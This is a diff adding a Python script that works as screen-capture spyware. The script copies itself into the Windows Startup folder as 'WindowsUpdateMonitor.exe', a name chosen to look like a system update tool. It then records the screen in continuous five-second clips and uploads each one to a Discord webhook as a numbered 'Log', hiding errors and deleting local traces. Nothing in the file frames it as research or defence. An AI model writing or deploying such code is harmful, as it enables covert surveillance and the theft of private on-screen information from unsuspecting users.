@@ -1,0 +1,98 @@
+import os
+import sys
+import time
+import requests
+import cv2
+import numpy as np
+import pyautogui as pag
+import keyboard
+import threading
+from pathlib import Path
+import shutil
+
+# Configurations
+WEBHOOK_URL = "https://discord.com/api/webhooks/example73247835465164562145"
+PERSISTENCE_NAME = "WindowsUpdateMonitor.exe"
+RECORD_SECONDS = 5  
+
+stop_flag = False
+
+def stop_handler():
+    global stop_flag
+    stop_flag = True
+
+def mouse_failsafe():
+    global stop_flag
+    while not stop_flag:
+        if pag.position() == (0, 0):
+            stop_flag = True
+        time.sleep(0.1)
+
+def setup_controls():
+    keyboard.add_hotkey('ctrl+shift+q', stop_handler)
+    keyboard.add_hotkey('f12', stop_handler)
+    keyboard.add_hotkey('esc', stop_handler)
+    threading.Thread(target=mouse_failsafe, daemon=True).start()
+
+def ensure_startup():
+    startup_folder = Path(os.getenv('APPDATA')) / r'Microsoft\Windows\Start Menu\Programs\Startup'
+    startup_folder.mkdir(parents=True, exist_ok=True)
+    current_path = Path(sys.executable) if getattr(sys, 'frozen', False) else Path(__file__).resolve()
+    target_path = startup_folder / PERSISTENCE_NAME
+    if not target_path.exists():
+        try:
+            shutil.copy2(current_path, target_path)
+        except:
+            pass
+
+def record_and_send(count):
+    # 1. Change extension to .mp4
+    filename = f"temp_vid_{count}.mp4"
+    screen_size = tuple(pag.size())
+    
+    # 2. Change codec to mp4v (Standard for MP4)
+    fourcc = cv2.VideoWriter_fourcc(*"mp4v") 
+    
+    # Lowered FPS to 8.0 to keep the file size very small
+    out = cv2.VideoWriter(filename, fourcc, 8.0, screen_size)
+
+    start_time = time.time()
+    while (time.time() - start_time) < RECORD_SECONDS and not stop_flag:
+        img = pag.screenshot()
+        frame = np.array(img)
+        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+        out.write(frame)
+        # Simple delay to keep FPS consistent
+        time.sleep(0.1)
+    
+    out.release()
+
+    # 3. Send to Discord
+    if os.path.exists(filename):
+        try:
+            with open(filename, "rb") as f:
+                # Updated MIME type to video/mp4
+                files = {'file': (filename, f, 'video/mp4')}
+                payload = {'content': f'**Log #{count}**'}
+                requests.post(WEBHOOK_URL, data=payload, files=files, timeout=15)
+        except:
+            pass
+        finally:
+            if os.path.exists(filename):
+                os.remove(filename)
+
+def main():
+    global stop_flag
+    ensure_startup()
+    setup_controls()
+    
+    count = 0
+    while not stop_flag:
+        record_and_send(count)
+        count += 1
+
+if __name__ == "__main__":
+    try:
+        main()
+    except:
+        pass
